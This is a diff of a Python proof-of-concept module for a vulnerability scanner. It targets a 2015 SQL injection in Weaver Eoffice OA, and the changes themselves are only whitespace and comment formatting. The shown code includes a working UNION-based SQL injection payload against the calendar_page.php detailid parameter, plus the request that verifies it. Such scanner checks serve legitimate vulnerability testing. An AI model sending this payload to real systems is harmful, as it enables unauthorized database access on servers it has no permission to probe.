@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0014' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0014'  # 平台漏洞编号，留空
     name = '泛微Eoffice SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-07-22'  # 漏洞公布时间
     desc = '''
         泛微Eoffice参数过滤不严谨，导致SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '泛微OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd40b8fb4-1739-448e-a90e-14ced9a78835'
@@ -32,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref: http://wooyun.org/bugs/wooyun-2015-0127270  
+
+            # ref: http://wooyun.org/bugs/wooyun-2015-0127270
             payload = '/E-mobile/calendar_page.php?detailid=-5272%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,md5(1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
             verify_url = self.target + payload
             r = requests.get(verify_url)
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
